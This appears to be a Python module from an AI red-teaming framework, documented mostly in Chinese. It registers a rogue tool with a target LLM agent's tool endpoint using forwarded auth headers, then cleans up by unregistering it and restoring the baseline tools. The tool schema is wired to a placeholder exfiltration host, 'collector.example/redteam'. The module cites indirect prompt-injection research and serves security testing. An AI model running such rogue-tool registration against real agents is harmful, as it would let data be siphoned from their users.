# -*- coding: utf-8 -*-
# arXiv:2302.12173 - Greshake et al., Indirect Prompt Injection
# arXiv:2307.00929 - Zhan et al., InjecAgent (schema-guided injection)
"""strike/agent/attacks.py — ReAct / Tool-use Agent 攻击分发器（含 I13 副作用清理）。

闭合 BL-093：此前 `agent` 组件的 cleanup 动作（`unregister_rogue_tool` /
`restore_agent_tools`）虽已实装并注册，但**无攻击分发器**，故清理从未在真实攻击
路径执行——rogue 工具注册会在目标侧留下持久工具集副作用（OWASP ASI10）。

本分发器沿用 `strike/multimodal_upload/file_upload_executor.run_file_upload_attack`
（BL-064 已验收）的同款三段式，**不新建第二套机制**（C3）：

    1. 副作用步**前**：`preflight_cleanup()` —— 动作未实装即拒绝（不静默放行，C9 / R-H2）
    2. 执行攻击：注册 rogue tool（复用既有 payload 构造器，不重写进攻语义）
    3. 副作用步**后**：`run_side_effect_cleanup()` —— 撤销 rogue 工具并恢复基线工具集

唯一新增 verbs = 向工具注册端点 POST rogue tool schema（缺省 `/tools/register`），
与清理侧既有的 `/tools/unregister`、`/tools/restore` 严格对称。

Constitution compliance:
    - I13：非 dry-run 且 cleanup 未实装 → `blocked`，拒绝执行副作用步
    - NEG-4 / R-H3：单一职责——仅做编排与清理接线，payload 构造委托既有模块
    - R-IMPORT：仅 `strike→core` 单向依赖
    - R-S1：目标地址全部来自运行时参数，无硬编码目标
    - R-S4：可测——HTTP I/O 全部经 `aiohttp` 并可在测试中 mock
"""

from __future__ import annotations

import logging
from typing import Any

logger = logging.getLogger(__name__)


async def run_agent_attack(ctx: Any) -> dict[str, Any]:
    """Execute the agent attack chain integrated with the pipeline context.

    Dispatch entry (mirrors ``run_file_upload_attack``): called from the strike
    phase via ``_run_agent_attack_phase``. Reads configuration from ``ctx.args``.

    Args:
        ctx: PipelineContext carrying attack configuration and the orchestration log.

    Returns:
        Dict with attack + cleanup results for ``ctx.attack_results``. Under I13,
        returns ``status="blocked"`` when declared cleanup actions are not
        implemented (non dry-run only).
    """
    args = getattr(ctx, "args", None)
    if not args:
        return {"status": "error", "reason": "No args in context"}

    target_url = getattr(args, "agent_target", None)
    register_endpoint = getattr(args, "agent_register_endpoint", "/tools/register")
    unregister_endpoint = getattr(args, "agent_unregister_endpoint", "/tools/unregister")
    restore_endpoint = getattr(args, "agent_restore_endpoint", "/tools/restore")
    rogue_tool_name = getattr(args, "rogue_tool_name", "sys_maintenance")
    baseline_tools = list(getattr(args, "agent_baseline_tools", []) or [])
    egger_endpoint = getattr(args, "agent_exfil_endpoint", "https://collector.example/redteam")
    dry_run = bool(getattr(args, "dry_run", False))
    timeout = int(getattr(args, "timeout", 30) or 30)

    if not target_url:
        return {"status": "error", "reason": "No agent target specified (--agent-target)"}

    # 依赖在调用期内导入：避免包导入期与 core 侧的循环依赖。
    from core.side_effect_cleanup import (
        preflight_cleanup,
        run_side_effect_cleanup,
    )
    from strike.agent.rogue_tool import build_rogue_tool_schema

    # ---- I13 preflight：声明的 cleanup 动作必须已实装，否则拒绝副作用步 ----
    preflight = preflight_cleanup(ctx, "agent", dry_run=dry_run)
    if not preflight.get("allowed", False):
        logger.warning("[Agent] blocked by I13 cleanup preflight: %s", preflight.get("reason"))
        if hasattr(ctx, "orchestration_log"):
            ctx.orchestration_log.append(
                {
                    "phase": "strike",
                    "decision": "agent_attack_blocked_by_i13",
                    "input": {"target": target_url, "rogue_tool": rogue_tool_name},
                    "output": {"status": "blocked"},
                    "reasoning": str(preflight.get("reason")),
                }
            )
        return {"status": "blocked", "reason": preflight.get("reason"), "cleanup": preflight}

    schema = build_rogue_tool_schema(name=rogue_tool_name, exfil_endpoint=egger_endpoint)

    # dry-run：不产生任何真实副作用，清理亦不执行。
    if dry_run:
        logger.info("[Agent] dry-run: rogue tool '%s' not registered", rogue_tool_name)
        return {
            "status": "skipped",
            "reason": "dry-run：不产生副作用，未注册 rogue tool",
            "rogue_tool": rogue_tool_name,
            "cleanup": preflight,
        }

    headers = _get_auth_header_from_ctx(ctx)
    target_url = target_url.rstrip("/")
    registration = await _register_rogue_tool(
        target_url,
        register_endpoint,
        schema,
        headers=headers,
        timeout=timeout,
    )
    registered = [rogue_tool_name] if registration.get("success") else []

    if hasattr(ctx, "orchestration_log"):
        ctx.orchestration_log.append(
            {
                "phase": "strike",
                "decision": "agent_rogue_tool_attack",
                "input": {
                    "target": target_url,
                    "register_endpoint": register_endpoint,
                    "rogue_tool": rogue_tool_name,
                },
                "output": {
                    "registered": bool(registered),
                    "http_status": registration.get("status"),
                    "error": registration.get("error"),
                },
                "reasoning": (
                    f"Agent rogue tool registration: {rogue_tool_name}, "
                    f"registered={bool(registered)}"
                ),
            }
        )

    # ---- I13 副作用清理：注销 rogue tool + 恢复基线工具集 ----
    cleanup_report = await run_side_effect_cleanup(
        ctx,
        "agent",
        {
            "target_url": target_url,
            "tool_unregister_endpoint": unregister_endpoint,
            "tool_restore_endpoint": restore_endpoint,
            "rogue_tool_names": registered,
            "baseline_toolset": baseline_tools,
            "headers": headers,
        },
        dry_run=dry_run,
    )
    if cleanup_report.get("status") == "failed":
        logger.warning(
            "[Agent] cleanup failed (target may retain rogue tool): %s",
            cleanup_report.get("failed"),
        )

    return {
        "status": "success" if registered else "failed",
        "target": target_url,
        "rogue_tool": rogue_tool_name,
        "registered": registered,
        "registration": registration,
        "cleanup": cleanup_report,
    }


async def _register_rogue_tool(
    target_url: str,
    endpoint: str,
    schema: dict[str, Any],
    *,
    headers: dict[str, str] | None,
    timeout: int,
) -> dict[str, Any]:
    """POST the rogue tool schema to the agent's tool-registration endpoint.

    Counterpart of the cleanup action `unregister_rogue_tool` (which POSTs to
    `/tools/unregister`); no second I/O mechanism is introduced.
    """
    try:
        import aiohttp
    except ImportError:  # 可选依赖缺席 → 明确失败，禁止静默降级（R-H1）
        return {"success": False, "error": "aiohttp 不可用"}

    url = f"{target_url.rstrip('/')}/{endpoint.lstrip('/')}"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(
                url,
                json=schema,
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=timeout),
            ) as resp:
                if resp.status < 400:
                    logger.info("[Agent] rogue tool registered: %s -> HTTP %d", url, resp.status)
                    return {"success": True, "status": resp.status}
                logger.warning("[Agent] rogue tool registration rejected: HTTP %d", resp.status)
                return {"success": False, "status": resp.status}
    except Exception as exc:
        logger.error("[Agent] rogue tool registration error: %s", exc)
        return {"success": False, "error": str(exc)}


def _get_auth_header_from_ctx(ctx: Any) -> dict[str, str] | None:
    """Build request headers from the pipeline context (parsed request / API key)."""
    headers: dict[str, str] = {}
    parsed = getattr(ctx, "parsed_request", None)
    if parsed and hasattr(parsed, "headers"):
        raw = parsed.headers or {}
        if isinstance(raw, dict):
            for key in ("Authorization", "authorization"):
                if key in raw:
                    headers["Authorization"] = raw[key]
                    break
    if "Authorization" not in headers:
        token = getattr(getattr(ctx, "args", None), "api_key", None)
        if token:
            headers["Authorization"] = f"Bearer {token}"
    return headers or None


__all__ = ["run_agent_attack"]
